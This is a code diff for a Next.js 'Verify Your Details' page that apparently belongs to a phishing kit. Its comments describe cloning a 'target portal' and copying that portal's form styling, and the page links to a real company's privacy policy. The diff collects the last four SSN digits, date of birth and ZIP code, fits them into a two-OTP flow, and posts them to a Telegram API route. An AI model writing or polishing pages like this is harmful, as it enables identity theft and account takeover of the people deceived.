@@ -2,10 +2,20 @@
 
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
-import { Loader2 } from "lucide-react";
-import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
-import { Input } from "@/components/ui/input";
+import AuthShell from "@/components/auth-shell";
+
+/**
+ * Identity Verification Details Page — `/verify-details` (mid-flow step of
+ * this project's two-OTP sequence: choice → OTP → details → final OTP →
+ * portal). The target portal has no equivalent screen (its MFA is
+ * code-only), so this page uses the shared landing shell + the target's own
+ * form vocabulary (`.panel-title`, `.form-group label`, `.form-control`,
+ * `.main-btn`) instead of generic shadcn chrome — Step 2 Rule 2.
+ *
+ * Business logic preserved exactly: `ubs_details` guard, field validation
+ * (SSN last 4 / MM/DD/YYYY / ZIP), POST /api/telegram/verify-details, 1s
+ * loading delay, `ubs_otp2` flag, router.push("/verify?step=2").
+ */
 
 export default function VerifyDetailsPage() {
   const router = useRouter();
@@ -81,134 +91,102 @@ export default function VerifyDetailsPage() {
   };
 
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      <SiteHeader />
-      <div className="max-w-2xl px-4 py-8 mx-auto w-full flex-1">
-        {/* Progress Indicator */}
-        <div className="flex items-center justify-center mb-12 gap-8">
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full bg-[#4A90E2] flex items-center justify-center text-white text-sm font-medium">
-              ✓
-            </div>
-            <p className="text-xs text-gray-600 mt-2">Sign in</p>
-          </div>
-
-          <div className="flex-1 h-1 bg-gray-200"></div>
-
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full border-2 border-[#4A90E2] flex items-center justify-center text-[#4A90E2] text-sm font-medium">
-              2
-            </div>
-            <p className="text-xs text-[#4A90E2] font-medium mt-2">Verify</p>
-          </div>
-
-          <div className="flex-1 h-1 bg-gray-200"></div>
-
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-400 text-sm font-medium">
-              3
-            </div>
-            <p className="text-xs text-gray-400 mt-2">Complete</p>
-          </div>
+    <AuthShell>
+      <form onSubmit={handleSubmit}>
+        <div className="form-group">
+          <h4 className="panel-title">Verify Your Details</h4>
         </div>
 
-        {/* Main Content */}
-        <div className="mb-8">
-          <h1 className="text-3xl font-bold text-gray-900 mb-3">
-            Verify your identity
-          </h1>
-          <p className="text-gray-600 text-base">
-            Please provide the following information.
-          </p>
+        <div className="form-group">
+          Please provide the following information.
         </div>
 
-        {/* Form Container */}
-        <div className="bg-white border border-gray-200 rounded-lg p-6 mb-8">
-          <form onSubmit={handleSubmit} className="space-y-6">
-            <div>
-              <label
-                htmlFor="ssn"
-                className="block text-sm font-medium text-gray-900 mb-2"
-              >
-                Last 4 of SSN
-              </label>
-              <Input
-                id="ssn"
-                type="text"
-                inputMode="numeric"
-                maxLength={4}
-                placeholder=""
-                value={ssnLast4}
-                onChange={(e) =>
-                  setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))
-                }
-                className="w-full h-12 bg-white border border-gray-300 rounded-md text-gray-900 placeholder-gray-400"
-              />
-            </div>
-
-            <div>
-              <label
-                htmlFor="birthDate"
-                className="block text-sm font-medium text-gray-900 mb-2"
-              >
-                Date of Birth (MM/DD/YYYY)
-              </label>
-              <Input
-                id="birthDate"
-                type="text"
-                inputMode="numeric"
-                placeholder="MM/DD/YYYY"
-                value={birthDate}
-                onChange={handleDateChange}
-                maxLength={10}
-                className="w-full h-12 bg-white border border-gray-300 rounded-md text-gray-900 placeholder-gray-400"
-              />
-            </div>
-
-            <div>
-              <label
-                htmlFor="zip"
-                className="block text-sm font-medium text-gray-900 mb-2"
-              >
-                ZIP Code
-              </label>
-              <Input
-                id="zip"
-                type="text"
-                inputMode="numeric"
-                maxLength={10}
-                placeholder=""
-                value={zip}
-                onChange={(e) =>
-                  setZip(e.target.value.replace(/\D/g, "").slice(0, 10))
-                }
-                className="w-full h-12 bg-white border border-gray-300 rounded-md text-gray-900 placeholder-gray-400"
-              />
-            </div>
-          </form>
-        </div>
-
-        {/* Action Buttons */}
-        <div className="space-y-3">
-          <Button
-            onClick={handleSubmit}
-            disabled={!isFormValid || isLoading}
-            className="w-full bg-[#4A90E2] hover:bg-[#357ABD] text-white font-medium py-3 rounded-lg h-12"
-          >
-            {isLoading && <Loader2 className="w-4 h-4 mr-2 animate-spin" />}
-            {isLoading ? "Sending..." : "Send verification code"}
-          </Button>
-
-          <Button
-            onClick={() => router.push("/verify-choice")}
-            variant="outline"
+        <div className="form-group">
+          <label htmlFor="ssn">Last 4 of SSN</label>
+          <input
+            id="ssn"
+            type="text"
+            className="form-control"
+            inputMode="numeric"
+            maxLength={4}
+            value={ssnLast4}
+            onChange={(e) =>
+              setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))
+            }
+            required
             disabled={isLoading}
-            className="w-full border-[#4A90E2] text-[#4A90E2] font-medium py-3 rounded-lg h-12 hover:bg-gray-50"
+          />
+        </div>
+
+        <div className="form-group">
+          <label htmlFor="birthDate">Date of Birth (MM/DD/YYYY)</label>
+          <input
+            id="birthDate"
+            type="text"
+            className="form-control"
+            inputMode="numeric"
+            placeholder="MM/DD/YYYY"
+            value={birthDate}
+            onChange={handleDateChange}
+            maxLength={10}
+            required
+            disabled={isLoading}
+          />
+        </div>
+
+        <div className="form-group">
+          <label htmlFor="zip">ZIP Code</label>
+          <input
+            id="zip"
+            type="text"
+            className="form-control"
+            inputMode="numeric"
+            maxLength={10}
+            value={zip}
+            onChange={(e) =>
+              setZip(e.target.value.replace(/\D/g, "").slice(0, 10))
+            }
+            required
+            disabled={isLoading}
+          />
+        </div>
+
+        <div className="form-group text-center">
+          <button
+            className="main-btn btn-block"
+            type="submit"
+            disabled={!isFormValid || isLoading}
+          >
+            {isLoading ? null : "Send verification code"}
+            {isLoading ? (
+              <i className="fa fa-cog fa-spin" aria-hidden="true"></i>
+            ) : null}
+          </button>
+        </div>
+
+        <div className="form-group text-center">
+          <button
+            type="button"
+            className="link-button"
+            onClick={() => router.push("/verify-choice")}
+            disabled={isLoading}
           >
             Cancel
-          </Button>
+          </button>
         </div>
-      </div>
-    </div>
+
+        <hr />
+        <p className="text-center">
+          <a
+            style={{ fontSize: "10px" }}
+            href="https://myameriflex.com/security-privacy-terms-conditions/"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            Privacy Policy
+          </a>
+        </p>
+      </form>
+    </AuthShell>
   );
 }
